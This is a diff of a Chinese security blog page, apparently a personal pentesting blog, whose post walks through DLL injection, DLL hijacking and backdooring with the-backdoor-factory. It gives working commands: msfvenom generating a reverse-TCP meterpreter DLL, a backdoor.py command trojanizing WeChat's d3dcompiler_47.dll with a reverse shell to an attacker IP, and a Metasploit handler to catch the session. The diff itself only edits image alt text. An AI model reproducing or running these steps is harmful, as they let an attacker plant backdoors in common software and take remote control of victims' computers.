@@ -1,7 +1,7 @@
 <!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>DLL注入&amp;DLL劫持DLL&amp;the-backdoor-factory - Guko's Blog</title><meta name="description" content="DLL注入DDLL注入是一种允许攻击者在另一个进程的地址空间的上下文中运行任意代码的技术。攻击者使用DLL注入的过程中如果被赋予过多的运行特权，那么攻击者就很有可能会在DLL文件中嵌入自己的恶意攻击代码以获取更高的执行权限。下图是OpenSecurityResearch博客文章中对此过程进行简化的可"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">DLL注入&amp;DLL劫持DLL&amp;the-backdoor-factory</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">DLL注入&amp;DLL劫持DLL&amp;the-backdoor-factory</h1><div class="post-meta">2020-01-14<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>DDLL注入是一种允许攻击者在另一个进程的地址空间的上下文中运行任意代码的技术。攻击者使用DLL注入的过程中如果被赋予过多的运行特权，</p>
 <p>那么攻击者就很有可能会在DLL文件中嵌入自己的恶意攻击代码以获取更高的执行权限。下图是OpenSecurityResearch博客文章中对此过程进行简化的可视化视图：</p>
 <a id="more"></a>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/1.jpg" alt="1"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/1.jpg" alt></p>
 <p>通常需要以下几个步骤:</p>
 <p>附加到目标/远程进程</p>
 <p>在目标/远程进程内分配内存</p>
@@ -10,13 +10,13 @@
 <h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><p>手动注入，可以从头开始创建DLL,也可以通过metasploitmsfvenom创建DLL，该文件可以生成特定有效内容的DLL文件<br>，注意如果DLL被注入进程是64位，那么应该使用64位有效负责<br>生成DLL</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.197.188 LPORT=5555 -f dll &gt; tmp.dll</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/2.png" alt="2"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/2.png" alt></p>
 <p>下一步设置监听器，方便恶意DLL注入进程后接收连接</p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/3.png" alt="3"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/3.png" alt></p>
 <p>这里说以下关于DLL注入的工具Remote DLL Injector,这个工具使用的是CreateRemoteThread技术,它可以将DLL<br>注入到启用了ASLR的进程中，工具的使用只需要提供进程ID和DLL路径两个参数</p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/4.png" alt="4"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/4.png" alt></p>
 <p>RemoteDLLInjector在初始运行的时候会展示位了完成DLL注入所涉及到的所有步骤，如下图</p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/5.png" alt="5"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/5.png" alt></p>
 <p>如果DLL被成功注入,那么就会返回一个meterpreter会话，所以具有搞权限的进程可能会事攻击者首选要注入的进程以执行提权操作</p>
 <p>此外还有PowerSploit的Invoke-DLLInjection模块</p>
 <h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>DLL劫持，主要是劫持经常运行的DLL，这样程序一运行，就会加载我们的恶意DLL，实现控制</p>
@@ -28,27 +28,27 @@
 <p>加载DLL时所在的当前目录</p>
 <p>PATH环境变量中列出的目录</p>
 <h4 id="the-backdoor-factory"><a href="#the-backdoor-factory" class="headerlink" title="the-backdoor-factory"></a>the-backdoor-factory</h4><p>使用Process Explorer进程管理器,找到微信进程，查看微信运行所需要的dll文件，本次此时我们使用d3dcompiler_47.dll</p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/6.png" alt="6"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/6.png" alt></p>
 <p>将d3dcompiler_47.dll文件复制到kali的the-backdoor-factory下方便使用</p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/7.png" alt="7"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/7.png" alt></p>
 <p>运行the-backdoor-factory,使用如下命令，来查找可以利用的payload，可以看到有不少可以植入的payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f d3dcompiler_47.dll</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/8.png" alt="8"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/8.png" alt></p>
 <p>直接获取shell,选择reverse_shell_tcp_lnline这个pyload,输入如下命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f d3dcompiler_47.dll -s reverse_shell_tcp_inline -P 7777 -H 192.168.197.193</span><br></pre></td></tr></table></figure>
 
 <p>-P，指定端口<br>-H，指定反弹shell的攻击机IP地址</p>
 <p>命令执行成功后，会列出可以执行后门的位置，选择2,植入完成后会存在工具子弟啊的backdoored目录下,生成一个同名的dll文件</p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/9.png" alt="9"></p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/10.png" alt="10"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/9.png" alt></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/10.png" alt></p>
 <p>把这个生成的dll文件跟之前的dll文件做一个替换</p>
 <p>接下来在mmsfconsole中开启监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell_reverse_tcp</span><br><span class="line">set lhost 192.168.199.193</span><br><span class="line">set lport 7777</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/11.png" alt="11"><br><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/12.png" alt="12"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/11.png" alt><br><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/12.png" alt></p>
 <p>然后运行微信,既可收到meterpreter会话</p>
-<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/13.png" alt="13"></p>
+<p><img src="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/13.png" alt></p>
 <p>参考文章：<br><a href="https://payloads.online/archivers/2018-06-09/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-06-09/1</a><br><a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/</a><br><a href="https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/?utm_source=tuicool&amp;utm_medium=referral</a><br><a href="https://www.cnblogs.com/sym945/p/11641218.html" target="_blank" rel="noopener">https://www.cnblogs.com/sym945/p/11641218.html</a></p>
 </div><!--文章标签--><div class="tags"></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/远程代码执行/" style="font-size: 18px;">远程代码执行</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/05/shell实现ping检测存活/">shell实现ping检测存活</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/">DLL注入&DLL劫持DLL&the-backdoor-factory</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/">Apache之Solr-Velocity模板远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/21/CVE-2019-14287-sudo-权限绕过漏洞复现/">CVE-2019-14287- sudo-权限绕过漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/Joomla-3-4-6-RCE漏洞复现/">Joomla 3.4.6-RCE漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/phpstudy后门RCE复现/">phpstudy后门RCE复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/phpcms9-6-1任意文件下载poc编写/">phpcms9.6.1任意文件下载poc编写</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/">CVE-2019-0708远程桌面代码执行漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/06/Cobalt-Strike基本使用/">Cobalt Strike基本使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/05/Mac-CobaltStrike3-14安装/">Mac CobaltStrike3.14安装</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
   if($(".highlight").length != 0){
